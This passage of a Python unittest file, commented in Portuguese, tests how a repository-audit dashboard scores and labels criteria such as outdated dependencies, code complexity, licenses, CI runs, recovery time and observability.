        self.assertIn("12/semana", rot)
        self.assertIs(ok, True)


class TestCritical2DependenciaNodeEntraNaNota(unittest.TestCase):
    """Metade-render do Critical 2 (a metade-coletor esta em
    test_nao_medido.py). Com `total` presente, 37 de 40 dependencias velhas
    finalmente descontam do eixo Seguranca — antes o criterio era descartado
    e um projeto Node abandonado tirava a MESMA nota de um em dia."""

    @staticmethod
    def _com_deps(desatualizadas, total):
        return _snap(governance={
            "segredos_commitados": [], "workflows": {"sem_pin": [], "sem_permissions": []},
            "dependabot": True, "docs": {"readme": "README.md"},
            "dependencias": {"ferramenta": "npm", "desatualizadas": desatualizadas,
                             "total": total},
        })

    def test_projeto_com_deps_velhas_tira_nota_menor_que_o_em_dia(self):
        velho = {x["nome"]: x for x in render.auditoria(self._com_deps(37, 40))[0]}
        em_dia = {x["nome"]: x for x in render.auditoria(self._com_deps(1, 40))[0]}
        self.assertIs(_criterio(self._com_deps(37, 40), "Segurança",
                                "dependências atualizadas")[1], False)
        self.assertIs(_criterio(self._com_deps(1, 40), "Segurança",
                                "dependências atualizadas")[1], True)
        self.assertLess(velho["Segurança"]["pct"], em_dia["Segurança"]["pct"])

    def test_sem_total_o_criterio_sai_como_nao_auditado_com_motivo(self):
        snap = _snap(governance={
            "segredos_commitados": [], "workflows": {},
            "dependencias": {"ferramenta": "npm", "desatualizadas": 37, "total": None,
                             "nao_medido": {"total": "package.json ilegível"}},
        })
        rot, ok = _criterio(snap, "Segurança", "dependências atualizadas")
        self.assertIs(ok, render.NAO_MEDIDO)
        self.assertIn("package.json ilegível", rot)
        self.assertNotIn("None", rot)


class TestCritical3MetodoDaComplexidade(unittest.TestCase):
    """O veredito do arquivo de maior atrito invertia conforme o radon estar
    instalado na maquina de quem audita.

    Sem radon a complexidade do mapa vem da contagem de `BRANCH_WORDS`, que o
    coletor declara servir "pra ordenar arquivos entre si, nao produzir um
    numero absoluto" — e o render comparava esse numero com um limiar
    absoluto (150). Escala medida nos arquivos deste repositorio: collect.py
    radon 473 / heuristica 354 (-25%), render.py 337 / 225 (-33%). Um alvo
    que o radon poe em 180 (reprova, P1, -3 pontos) a heuristica poe em 120
    (aprova, +3). A Task 4 criou `hotspots[].metodo` exatamente pra isso e o
    render nunca lia.
    """

    @staticmethod
    def _com_hotspot(complexity, metodo=None):
        h = {"file": "alvo.py", "churn": 20, "complexity": complexity, "loc": 900}
        if metodo:
            h["metodo"] = metodo
        return _snap(git={"hotspots": [h]})

    def test_radon_acima_do_limiar_continua_reprovando(self):
        rot, ok = _criterio(self._com_hotspot(180, "radon"), "Qualidade",
                            "arquivo de maior atrito")
        self.assertIs(ok, False)
        self.assertNotIn("não auditado", rot)

    def test_radon_abaixo_do_limiar_continua_aprovando(self):
        _, ok = _criterio(self._com_hotspot(120, "radon"), "Qualidade",
                          "arquivo de maior atrito")
        self.assertIs(ok, True)

    def test_heuristica_nao_e_julgada_contra_limiar_absoluto(self):
        """O caso que inverte: 120 pela heuristica e o mesmo arquivo que o
        radon poria em 180. Aprovar aqui e deixar o veredito depender do
        ambiente do auditor, nao do codigo auditado."""
        rot, ok = _criterio(self._com_hotspot(120, "heuristica"), "Qualidade",
                            "arquivo de maior atrito")
        self.assertIs(ok, render.NAO_MEDIDO)
        self.assertIn("complexidade estimada sem radon", rot)

    def test_heuristica_alta_tambem_sai_do_denominador(self):
        """Nem pra reprovar de verdade — mas entra na FAIXA (2026-08-22): a
        heuristica nao tem escala absoluta em nenhuma das duas direcoes, e a
        causa e o AMBIENTE (radon ausente), nao "nada a auditar"."""
        _, ok = _criterio(self._com_hotspot(400, "heuristica"), "Qualidade",
                          "arquivo de maior atrito")
        self.assertIs(ok, render.NAO_MEDIDO)

    def test_snapshot_antigo_sem_metodo_nao_e_julgado(self):
        """Snapshot anterior ao campo `metodo` (Task 4) tem procedencia
        desconhecida: pode ser radon, pode ser heuristica. Nao se julga o
        que nao se sabe de onde veio — ambiente, entra na faixa."""
        rot, ok = _criterio(self._com_hotspot(180), "Qualidade",
                            "arquivo de maior atrito")
        self.assertIs(ok, render.NAO_MEDIDO)
        self.assertIn("não registrado", rot)


class TestImportant1BaseDaNota(unittest.TestCase):
    """Eixo com 1 de 4 criterios medidos recebia letra cheia: o `F` de um
    eixo apoiado so em "nao existe docs/runbooks/" e visualmente identico ao
    `F` de um eixo auditado inteiro."""

    @staticmethod
    def _so_runbooks():
        return _snap(governance={"docs": {"runbooks": None},
                                 "segredos_commitados": [], "workflows": {},
                                 "dependencias": {}})

    def test_eixo_declara_quantos_criterios_sustentam_a_letra(self):
        eixos = {x["nome"]: x for x in render.auditoria(self._so_runbooks())[0]}
        conf = eixos["Confiabilidade"]
        self.assertEqual(conf["medidos"], 1)
        self.assertEqual(conf["criterios"], 4)
        self.assertEqual(conf["letra"], "F")
        self.assertIn("1 de 4 critérios auditados", render.render([self._so_runbooks()]))

    def test_a_contagem_nao_mexe_no_calculo_da_nota(self):
        """Guard contra sobrecorrecao: a exposicao da base e informativa —
        a nota tem que continuar sendo a mesma fracao de antes."""
        eixos = {x["nome"]: x for x in render.auditoria(self._so_runbooks())[0]}
        self.assertEqual(eixos["Confiabilidade"]["pct"], 0)


class TestImportant2ColetorAusenteNoLaudo(unittest.TestCase):
    """`--only gouvernance` (typo) filtrava tudo em silencio e o dashboard
    desse snapshot dizia "ok — Nenhum alerta nos limiares configurados":
    laudo limpo de uma coleta que nao aconteceu."""

    def test_coletor_que_nem_foi_tentado_aparece_no_laudo(self):
        snap = _snap(collectors_run=[], errors={})
        html = render.render([snap])
        self.assertIn("coletor(es) fora desta coleta", html)
        self.assertNotIn("Nenhum alerta nos limiares configurados", html)

    def test_coleta_completa_nao_reclama_de_ausencia(self):
        """Mutacao inversa: snapshot com todos os coletores nao pode ganhar
        um aviso inventado."""
        snap = _snap(collectors_run=list(render.COLETORES_ESPERADOS), errors={})
        self.assertNotIn("fora desta coleta", render.render([snap]))


class TestMinor6RotuloDoDjango(unittest.TestCase):
    """Repositorio que nem Django e exibia "avisos de segurança do framework
    (não auditado: settings de dev)" — o rotulo culpava o motivo errado, que
    e o texto do caso em que o check RODOU contra settings de dev."""

    def test_repo_sem_django_nao_culpa_settings_de_dev(self):
        snap = _snap(django={
            "pending_migrations": None, "deploy_issues": None, "other_issues": None,
            "nao_medido": {"deploy_issues": "projeto sem manage.py na raiz"},
        })
        rot, ok = _criterio(snap, "Segurança", "avisos de segurança do framework")
        self.assertIs(ok, render.NAO_MEDIDO)
        self.assertIn("projeto sem manage.py", rot)
        self.assertNotIn("settings de dev", rot)

    def test_django_em_dev_continua_dizendo_settings_de_dev(self):
        """Mutacao inversa: o motivo legitimo nao pode ter sumido."""
        snap = _snap(django={"pending_migrations": [], "deploy_issues": [],
                             "other_issues": [], "ambiente_de_producao": False})
        rot, ok = _criterio(snap, "Segurança", "avisos de segurança do framework")
        self.assertIs(ok, render.NAO_MEDIDO)
        self.assertIn("settings de dev", rot)


# ----------------------------------------------------------------------
# Calibragem de criterios (2026-08-13): verificacao independente achou 5
# pontos onde o auditor MEDIA certo e ROTULAVA errado, ou descontava ponto
# por criterio que nao se aplica.
# ----------------------------------------------------------------------

def _achados_do_eixo(snap, eixo):
    """Lista de textos de achado (item [2]) de um eixo — so aparecem quando
    o criterio correspondente reprovou (`ok is False`)."""
    return [txt for prio, nome, txt, acao in render.auditoria(snap)[1] if nome == eixo]


class TestAjuste1LicencaPrivadaNaoDesconta(unittest.TestCase):
    """LICENSE ausente so e achado em repositorio PUBLICO — o proprio texto
    do criterio ja dizia isso sem o codigo respeitar."""

    @staticmethod
    def _snap_licenca(visibility, licenca=None, governance_ok=True):
        if not governance_ok:
            return _snap(errors={"governance": "boom: falha inesperada"})
        bp = {"disponivel": True, "branch": "main"}
        if visibility is not None:
            bp["visibility"] = visibility
        return _snap(governance={
            "docs": {"readme": "README.md", "licenca": licenca, "adr": None,
                     "docs_dir": None, "runbooks": None, "changelog": None},
            "branch_protection": bp,
            "segredos_commitados": [], "workflows": {}, "dependencias": {},
            "pre_commit": True,
        })

    def test_repo_privado_sem_licenca_nao_reprova(self):
        rot, ok = _criterio(self._snap_licenca("PRIVATE", licenca=None), "Processo", "licença")
        self.assertIsNone(ok, "PRIVATE tem que sair 'nao se aplica' (None), nunca reprovar")
        self.assertIn("não se aplica: repositório privado", rot)

    def test_repo_publico_sem_licenca_continua_reprovando(self):
        """Guard contra sobrecorrecao: o ajuste 1 NAO pode fazer repo PUBLICO
        parar de reprovar — so o PRIVATE muda."""
        rot, ok = _criterio(self._snap_licenca("PUBLIC", licenca=None), "Processo", "licença")
        self.assertIs(ok, False)
        self.assertNotIn("não se aplica", rot)

    def test_repo_publico_com_licenca_aprova(self):
        _, ok = _criterio(self._snap_licenca("PUBLIC", licenca="LICENSE"), "Processo", "licença")
        self.assertIs(ok, True)

    def test_repo_privado_com_licenca_tambem_nao_reprova(self):
        """PRIVATE com o arquivo presente continua 'nao se aplica' — o
        criterio inteiro sai da conta, nao vira credito escondido."""
        _, ok = _criterio(self._snap_licenca("PRIVATE", licenca="LICENSE"), "Processo", "licença")
        self.assertIsNone(ok)

    def test_visibilidade_desconhecida_mantem_comportamento_e_avisa(self):
        """Sem `gh`/repo sem remote: `branch_protection` roda sem `visibility`.
        O criterio continua reprovando arquivo ausente como sempre reprovou
        — so o rotulo ganha o aviso de que a visibilidade nao foi apurada."""
        rot, ok = _criterio(self._snap_licenca(None, licenca=None), "Processo", "licença")
        self.assertIs(ok, False, "visibilidade desconhecida mantem o comportamento de hoje")
        self.assertIn("visibilidade do repositório não apurada", rot)

    def test_coletor_governance_fora_do_ar_nao_duplica_mensagem(self):
        """Quando `governance` nem rodou, o motivo generico ja basta — nao
        pode empilhar 'nao auditado: ...' junto com 'visibilidade nao apurada'."""
        rot, ok = _criterio(self._snap_licenca(None, governance_ok=False),
                            "Processo", "licença")
        self.assertIs(ok, render.NAO_MEDIDO)
        self.assertIn("não auditado", rot)
        self.assertNotIn("visibilidade do repositório não apurada", rot)


class TestAjuste2PreCommitEChangelogReprovam(unittest.TestCase):
    """`gov.get("pre_commit") or None` e `bool(changelog) or None` tiravam o
    criterio MEDIDO-E-AUSENTE do denominador — o inverso do achado parqueado
    (medicao vira credito) matando um achado real em vez de inventar um."""

    @staticmethod
    def _snap_gov(pre_commit, changelog):
        return _snap(governance={
            "docs": {"readme": "README.md", "licenca": "LICENSE", "adr": None,
                     "docs_dir": None, "runbooks": None, "changelog": changelog},
            "pre_commit": pre_commit,
            "segredos_commitados": [], "workflows": {}, "dependencias": {},
        })

    def test_pre_commit_ausente_reprova(self):
        _, ok = _criterio(self._snap_gov(False, None), "Processo", "hooks de pre-commit")
        self.assertIs(ok, False, "medido e ausente tem que reprovar, nao sumir do denominador")

    def test_pre_commit_presente_aprova(self):
        _, ok = _criterio(self._snap_gov(True, None), "Processo", "hooks de pre-commit")
        self.assertIs(ok, True)

    def test_changelog_ausente_reprova(self):
        _, ok = _criterio(self._snap_gov(False, None), "Processo", "histórico de mudanças")
        self.assertIs(ok, False)

    def test_changelog_presente_aprova(self):
        _, ok = _criterio(self._snap_gov(False, "CHANGELOG.md"), "Processo", "histórico de mudanças")
        self.assertIs(ok, True)

    def test_coletor_governance_caido_continua_nao_auditado(self):
        """Guard contra sobrecorrecao: o UNICO jeito de sair NAO_MEDIDO e o
        coletor `governance` inteiro nao ter rodado — esse caminho ja tinha
        teste (`TestGovernanceAusenteNaoReprova`) e nao pode quebrar."""
        sem_governance = _snap(errors={"governance": "boom: falha inesperada"})
        _, ok_pre = _criterio(sem_governance, "Processo", "hooks de pre-commit")
        _, ok_change = _criterio(sem_governance, "Processo", "histórico de mudanças")
        self.assertIs(ok_pre, render.NAO_MEDIDO)
        self.assertIs(ok_change, render.NAO_MEDIDO)

    def test_nota_do_eixo_muda_quando_pre_commit_ausente(self):
        """Prova ponta a ponta: antes do fix, dois snapshots com pre_commit
        diferente batiam na MESMA nota (o criterio saia do denominador dos
        dois). Agora a nota tem que DIFERIR."""
        com = {x["nome"]: x for x in render.auditoria(self._snap_gov(True, "CHANGELOG.md"))[0]}
        sem = {x["nome"]: x for x in render.auditoria(self._snap_gov(False, None))[0]}
        self.assertNotEqual(com["Processo"]["pct"], sem["Processo"]["pct"])


class TestAjuste3AchadoDePermissionsNoJob(unittest.TestCase):
    """O criterio (bloco `permissions` no TOPO) nao muda — so o TEXTO do
    achado, que agora diz quantos workflows ja restringem o job que escreve,
    em vez de deixar o leitor concluir que ninguem tratou do assunto."""

    @staticmethod
    def _snap_wf(sem_permissions, permissions_no_job):
        # `count: 3` declara que ha workflows no repo — sem ele, a regra de
        # 2026-08-20 (zero workflows = "nada a auditar") tornaria o fixture
        # de listas vazias indistinguivel de repo sem CI.
        return _snap(governance={
            "workflows": {"count": 3, "sem_pin": [], "sem_permissions": sem_permissions,
                          "permissions_no_job": permissions_no_job},
            "segredos_commitados": [], "dependencias": {},
        })

    def test_achado_menciona_quantos_ja_restringem_o_job(self):
        snap = self._snap_wf(["a.yml", "b.yml", "c.yml"], ["a.yml", "b.yml"])
        achados = _achados_do_eixo(snap, "Segurança")
        achado = next(a for a in achados if "permissions" in a.lower() or "workflow(s) sem" in a)
        self.assertIn("2", achado)
        self.assertIn("job", achado.lower())

    def test_sem_nenhum_job_restrito_nao_menciona_contagem_de_job(self):
        """Guard contra sobrecorrecao: 0 workflows com job restrito nao pode
        inventar uma frase de credito."""
        snap = self._snap_wf(["a.yml"], [])
        achados = _achados_do_eixo(snap, "Segurança")
        achado = next(a for a in achados if "permissions" in a.lower() or "workflow(s) sem" in a)
        self.assertNotIn("já restringe", achado)

    def test_criterio_continua_sendo_o_bloco_no_topo(self):
        """O ajuste nao pode mudar o `ok` — so o texto. Com `sem_permissions`
        vazio (todos com bloco no topo) o criterio aprova, mesmo que nenhum
        tenha `permissions_no_job` registrado."""
        snap = self._snap_wf([], [])
        _, ok = _criterio(snap, "Segurança", "workflows com permissions declarado")
        self.assertIs(ok, True)


class TestAjuste4AvisoDeSegurancaDizOAmbiente(unittest.TestCase):
    """`security.W009` medido com o settings_module de PRODUCAO nao e a
    postura de producao — as variaveis de ambiente sao as da maquina de quem
    audita. O achado tinha o fato certo e a leitura enganosa."""

    @staticmethod
    def _snap_prod(issues):
        return _snap(django={
            "deploy_issues": issues, "other_issues": [],
            "ambiente_de_producao": True, "settings_module": "projeto.settings.producao",
        })

    def test_achado_distingue_modulo_de_ambiente(self):
        snap = self._snap_prod([{"code": "security.W009", "message": "SECRET_KEY fraca"}])
        achados = _achados_do_eixo(snap, "Segurança")
        achado = next(a for a in achados if "produ" in a.lower() and "seguran" in a.lower())
        self.assertIn("produção", achado.lower())
        self.assertIn("local", achado.lower())
        self.assertIn("ambiente", achado.lower())

    def test_acao_pede_reconferir_no_ambiente_real(self):
        snap = self._snap_prod([{"code": "security.W009", "message": "SECRET_KEY fraca"}])
        acoes = [acao for prio, nome, txt, acao in render.auditoria(snap)[1] if nome == "Segurança"]
        acao = next(a for a in acoes if "ambiente" in a.lower())
        self.assertIn("real", acao.lower())

    def test_findings_tambem_distingue_modulo_de_ambiente(self):
        snap = self._snap_prod([{"code": "security.W009", "message": "SECRET_KEY fraca"}])
        itens = render.findings(snap)
        achado = next(txt for nivel, txt in itens if "produ" in txt.lower() and "seguran" in txt.lower())
        self.assertIn("local", achado.lower())

    def test_dev_continua_sem_o_texto_de_ambiente_local(self):
        """Guard contra sobrecorrecao: em dev o texto de hoje (achado alto
        vs info) nao muda — so o caso PRODUCAO ganha o esclarecimento."""
        snap = _snap(django={"deploy_issues": [{"code": "security.W009", "message": "x"}],
                             "other_issues": [], "ambiente_de_producao": False})
        itens = render.findings(snap)
        nivel, _ = next((n, t) for n, t in itens if "DESENVOLVIMENTO" in t)
        self.assertEqual(nivel, "info")


class TestAjuste5CIVerdeComCancelado(unittest.TestCase):
    """"CI verde 100%" nao pode esconder um run cancelado — cancelar nao e
    falhar (a taxa continua igual), mas tambem nao confirma pipeline verde."""

    @staticmethod
    def _snap_ci(success_rate, cancelados, deploy_ok=None):
        return _snap(ci={"success_rate": success_rate, "cancelados": cancelados,
                         "cancelados_com_deploy_ok": deploy_ok or []})

    def test_rotulo_mostra_cancelados_quando_maior_que_zero(self):
        rot, ok = _criterio(self._snap_ci(100.0, 1), "Confiabilidade", "CI verde")
        self.assertIn("cancelado", rot)
        self.assertIs(ok, True, "a taxa em si continua decidindo o ok — cancelado nao reprova sozinho")

    def test_rotulo_sem_cancelado_nao_menciona_a_palavra(self):
        """Guard contra sobrecorrecao: sem cancelado, o rotulo fica como
        sempre foi — sem a mudanca de nada alem do que era medido."""
        rot, _ = _criterio(self._snap_ci(100.0, 0), "Confiabilidade", "CI verde")
        self.assertNotIn("cancelado", rot)

    def test_findings_emite_item_quando_ha_cancelado(self):
        itens = render.findings(self._snap_ci(90.0, 2))
        achado = next(t for _, t in itens if "cancelado" in t.lower())
        self.assertIn("2", achado)

    def test_findings_nao_emite_item_de_cancelado_quando_nao_ha(self):
        itens = render.findings(self._snap_ci(90.0, 0))
        self.assertFalse(any("cancelado" in t.lower() for _, t in itens))

    def test_findings_destaca_cancelado_com_deploy_bem_sucedido(self):
        """O caso que mais importa: cancelado cujo run tinha job de deploy
        ja bem-sucedido — vira achado 'alto', nao 'medio' generico."""
        snap = self._snap_ci(90.0, 1, deploy_ok=[{"workflow": "CI", "title": "run 1"}])
        itens = render.findings(snap)
        nivel, _ = next((n, t) for n, t in itens if "deploy" in t.lower() and "cancelado" in t.lower())
        self.assertEqual(nivel, "alto")


class TestFixRound1TextoDoJobDeployNaoAfirmaFato(unittest.TestCase):
    """Achado da revisao: o texto dizia "tinham um job de deploy CONCLUIDO
    COM SUCESSO" como fato apurado — mas "e um job de deploy" e inferencia
    de NOME (o coletor so mede `conclusion == "success"`). O texto tem que
    hedgear ("cujo nome sugere deploy"), sem deixar de apontar o que
    realmente importa: pipeline tratado como verde sem confirmacao."""

    @staticmethod
    def _snap_com_deploy_ok():
        return _snap(ci={"success_rate": 90.0, "cancelados": 1,
                         "cancelados_com_deploy_ok": [{"workflow": "CI", "title": "run 1"}]})

    def test_texto_nao_afirma_deploy_como_fato_apurado(self):
        itens = render.findings(self._snap_com_deploy_ok())
        achado = next(t for _, t in itens if "cancelado" in t.lower() and "deploy" in t.lower())
        self.assertNotIn("um job de deploy concluído com sucesso", achado.lower())
        self.assertNotIn("um job de deploy concluido com sucesso", achado.lower())

    def test_texto_hedgeia_que_e_o_nome_que_sugere_deploy(self):
        itens = render.findings(self._snap_com_deploy_ok())
        achado = next(t for _, t in itens if "cancelado" in t.lower() and "deploy" in t.lower())
        self.assertIn("nome", achado.lower())
        self.assertIn("sugere", achado.lower())

    def test_texto_continua_apontando_que_verde_nao_foi_confirmado(self):
        """Guard contra sobrecorrecao: o hedge nao pode apagar o ponto que
        importa — o pipeline foi tratado como verde sem o teste confirmar."""
        itens = render.findings(self._snap_com_deploy_ok())
        achado = next(t for _, t in itens if "cancelado" in t.lower() and "deploy" in t.lower())
        self.assertIn("verde", achado.lower())

    def test_severidade_continua_alta_apos_o_hedge(self):
        """Reavaliacao de severidade: decidido manter 'alto' mesmo com o
        hedge (justificativa no comentario do render.py e no relatorio) —
        este teste trava a decisao, nao so o texto."""
        itens = render.findings(self._snap_com_deploy_ok())
        nivel, _ = next((n, t) for n, t in itens if "cancelado" in t.lower() and "deploy" in t.lower())
        self.assertEqual(nivel, "alto")


class TestMttrSemFalhaExplicaOTraco(unittest.TestCase):
    """`mttr_h: None` tem DOIS motivos, e o painel dava o mesmo traco mudo
    pros dois.

    Depois do fix do DORA job-level (2026-08-21), o caso comum passou a ser
    "nenhum deploy falhou na janela" — boa noticia — e um traco sem
    explicacao le como "nao consegui medir", que e o oposto.

    O rotulo NAO pode ser ingenuo: `mttr_h` tambem fica `None` quando um
    deploy falhou e ainda NAO veio um verde depois dele. Escrever "nenhum
    deploy falhou" ali seria o painel mentindo justamente no caso ruim.
    O `ok` dos dois casos diverge desde a faixa de incerteza (2026-08-22):
    "nenhum deploy falhou" segue `None` (nada a auditar, nem premia nem
    pune) — mas "falha sem deploy verde depois" vira `NAO_MEDIDO` (entra na
    faixa pessimista: a recuperacao pendente conta contra, ate ser apurada).
    """

    def test_sem_falha_na_janela_o_traco_ganha_motivo(self):
        """O caso do ion depois do fix: 63 deploys, nenhum falhou."""
        snap = _snap(dora={"deploys_por_semana": 41.4, "lead_time_p50_h": 0.35,
                           "change_failure_rate": 0.0, "mttr_h": None,
                           "deploys_analisados": 63})
        rot, ok = _criterio(snap, "Entrega", "tempo de recuperação")
        self.assertIsNone(ok, "nada a auditar nem premia nem pune")
        self.assertIn("nada a auditar", rot)
        self.assertIn("nenhum deploy falhou", rot)

    def test_falha_ainda_sem_deploy_verde_nao_diz_que_ninguem_falhou(self):
        """O caso que proibe o rotulo ingenuo: houve falha, a recuperacao e
        que nao aconteceu ainda. O painel nao pode absolver."""
        snap = _snap(dora={"deploys_por_semana": 3, "lead_time_p50_h": 2,
                           "change_failure_rate": 50.0, "mttr_h": None,
                           "deploys_analisados": 4})
        rot, ok = _criterio(snap, "Entrega", "tempo de recuperação")
        self.assertIs(ok, render.NAO_MEDIDO, "falha pendente e ambiente que precisa medir — entra na faixa")
        self.assertNotIn("nenhum deploy falhou", rot)
        self.assertIn("sem deploy verde depois", rot)

    def test_mttr_medido_continua_limpo(self):
        """Guard contra sobrecorrecao: com numero medido, nenhum sufixo
        entra e o criterio segue valendo ponto."""
        snap = _snap(dora={"deploys_por_semana": 12, "lead_time_p50_h": 3,
                           "change_failure_rate": 4, "mttr_h": 1,
                           "deploys_analisados": 20})
        rot, ok = _criterio(snap, "Entrega", "tempo de recuperação")
        self.assertIs(ok, True)
        self.assertNotIn("nada a auditar", rot)
        self.assertNotIn("sem deploy verde", rot)

    def test_coletor_dora_ausente_continua_nao_auditado(self):
        """Guard de fronteira: sem o coletor, o motivo continua sendo "não
        auditado". O rotulo novo nao pode roubar o lugar do antigo — sao
        afirmacoes diferentes ("nao medi" != "medi e nao houve")."""
        snap = _snap(errors={"dora": "gh cli nao encontrado"})
        rot, ok = _criterio(snap, "Entrega", "tempo de recuperação")
        self.assertIs(ok, render.NAO_MEDIDO)
        self.assertIn("não auditado", rot)
        self.assertNotIn("nenhum deploy falhou", rot)

    def test_nao_medido_do_campo_vence_o_motivo_novo(self):
        """Precedencia, travada aqui porque uma mutacao passou por ela:
        se o coletor registrou que NAO MEDIU o mttr, esse motivo vence — o
        rotulo novo so responde por "medi e nao houve o que recuperar".
        As duas frases sao afirmacoes diferentes; a ordem entre elas nao
        pode virar acidente."""
        snap = _snap(dora={"deploys_por_semana": 41.4, "lead_time_p50_h": 0.35,
                           "change_failure_rate": 0.0, "mttr_h": None,
                           "deploys_analisados": 63,
                           "nao_medido": {"mttr_h": "git show falhou"}})
        rot, ok = _criterio(snap, "Entrega", "tempo de recuperação")
        self.assertIsNone(ok)
        self.assertIn("não auditado", rot)
        self.assertIn("git show falhou", rot)
        self.assertNotIn("nenhum deploy falhou", rot)

    def test_snapshot_velho_sem_deploys_analisados_fica_como_era(self):
        """Snapshot de antes do fix nao tem `deploys_analisados`. Sem saber
        se houve deploy, nao da pra afirmar nada — segue mudo, que e a
        direcao conservadora."""
        snap = _snap(dora={"deploys_por_semana": 5, "lead_time_p50_h": 2,
                           "change_failure_rate": 0.0, "mttr_h": None})
        rot, ok = _criterio(snap, "Entrega", "tempo de recuperação")
        self.assertIs(ok, render.NAO_MEDIDO,
                      "sem deploys_analisados nao da pra afirmar 'nada a auditar' — entra na faixa")
        self.assertNotIn("nenhum deploy falhou", rot)


class TestObservabilidadeExigivelSoQuemEntrega(unittest.TestCase):
    """Os 5 estados do criterio "infraestrutura observavel" (2026-08-21).

    Antes: `tem_alerta = bool(containers) or bool(db)` — a variavel prometia
    alerta e olhava container do HOST, e `tem_alerta or None` fazia o
    criterio NUNCA reprovar. Quem nao tinha observabilidade nenhuma saia do
    denominador em vez de perder ponto.

    Decisao do dono (2026-08-21): reprova, mas so de quem ENTREGA. Se o DORA
    identificou workflow de deploy, o projeto sobe pra algum lugar e precisa
    saber quando aquilo quebra. Biblioteca que nao deploya nao tem o que
    observar — "nada a auditar", como no fim dos 5 pontos de graca.
    """

    @staticmethod
    def _snap_obs(alertas=0, stack=(), com_deploy=True, dora=True):
        extra = {"governance": {
            "segredos_commitados": [],
            "workflows": {"count": 1, "sem_pin": [], "sem_permissions": []},
            "dependencias": {},
            "observabilidade": {"alertas": alertas, "stack": list(stack),
                                "arquivos_de_regra": [], "truncado": False},
        }}
        if dora:
            extra["dora"] = {"workflows_de_deploy": ["CI/CD"] if com_deploy else [],
                             "deploys_analisados": 5 if com_deploy else 0}
        return _snap(**extra)

    def test_alerta_declarado_passa(self):
        rot, ok = _criterio(self._snap_obs(alertas=45, stack=["prometheus"]),
                            "Confiabilidade", "infraestrutura observável")
        self.assertIs(ok, True)
        self.assertIn("45", rot)

    def test_coleta_sem_alerta_reprova(self):
        """O estado mais traicoeiro: tem Grafana bonito e ninguem e avisado.
        Antes isso passava (havia container); agora reprova com o motivo."""
        rot, ok = _criterio(self._snap_obs(alertas=0, stack=["grafana", "loki"]),
                            "Confiabilidade", "infraestrutura observável")
        self.assertIs(ok, False)
        self.assertIn("nenhum alerta", rot)

    def test_nada_declarado_com_deploy_reprova(self):
        rot, ok = _criterio(self._snap_obs(alertas=0, stack=[], com_deploy=True),
                            "Confiabilidade", "infraestrutura observável")
        self.assertIs(ok, False)

    def test_nada_declarado_sem_deploy_e_nada_a_auditar(self):
        """Biblioteca/CLI: nao entrega em lugar nenhum, nao ha o que observar.
        Fora do denominador — nem premia nem pune."""
        rot, ok = _criterio(self._snap_obs(alertas=0, stack=[], com_deploy=False),
                            "Confiabilidade", "infraestrutura observável")
        self.assertIsNone(ok)
        self.assertIn("nada a auditar", rot)

    def test_sem_o_coletor_dora_nao_afirma_nada(self):
        """Sem `gh` o DORA nao roda, e ai nao da pra saber se o projeto
        entrega. Nao afirmar > afirmar errado: cai em nao-auditado, nunca em
        reprovacao."""
        rot, ok = _criterio(self._snap_obs(alertas=0, stack=[], dora=False),
                            "Confiabilidade", "infraestrutura observável")
        self.assertIs(ok, render.NAO_MEDIDO)

    def test_snapshot_velho_sem_observabilidade_nao_reprova_por_ausencia(self):
        """Guard de compatibilidade: snapshot anterior a este fix nao tem o
        campo. Ausencia de dado nao pode virar acusacao."""
        snap = _snap(governance={"segredos_commitados": [],
                                 "workflows": {"count": 1, "sem_pin": [],
                                               "sem_permissions": []},
                                 "dependencias": {}},
                     dora={"workflows_de_deploy": ["CI/CD"]})
        rot, ok = _criterio(snap, "Confiabilidade", "infraestrutura observável")
        self.assertIs(ok, render.NAO_MEDIDO)


if __name__ == "__main__":
    unittest.main()
